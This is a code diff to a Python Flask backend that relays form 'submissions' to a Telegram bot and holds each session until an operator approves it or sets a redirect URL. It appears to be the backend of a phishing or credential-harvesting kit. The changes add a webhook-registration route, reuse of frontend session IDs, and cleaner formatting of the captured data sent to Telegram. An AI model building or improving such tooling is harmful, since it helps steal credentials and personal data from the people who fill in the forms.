@@ -32,6 +32,7 @@ PAGES = [
 def send_to_telegram(data, session_id, type_label):
     msg = f"<b>🔐 {type_label.upper()} Submission</b>\n\n"
     for key, value in data.items():
+        if key == "session_id": continue # Don't repeat ID in the list
         if isinstance(value, dict):
             msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
             for subkey, subvalue in value.items():
@@ -55,6 +56,14 @@ def send_to_telegram(data, session_id, type_label):
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
     except Exception as e:
         print(f"Telegram error: {e}")
+
+@app.route("/set_webhook", methods=["GET"])
+def register_webhook():
+    # VISIT THIS URL ONCE IN YOUR BROWSER AFTER DEPLOYING
+    # Update the url below to your actual domain
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url=YOUR_DOMAIN/webhook"
+    r = requests.get(url)
+    return jsonify(r.json())
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -86,8 +95,12 @@ def get_status(session_id):
 
 def handle_submission(label):
     data = request.get_json()
-    session_id = str(uuid.uuid4())
+    # FIX: Use existing session ID from frontend if provided, else make new one
+    session_id = data.get("session_id") or str(uuid.uuid4())
+    
+    # Initialize or reset session status
     SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
+    
     send_to_telegram(data, session_id, label)
     return jsonify({"success": True, "id": session_id}), 200
 
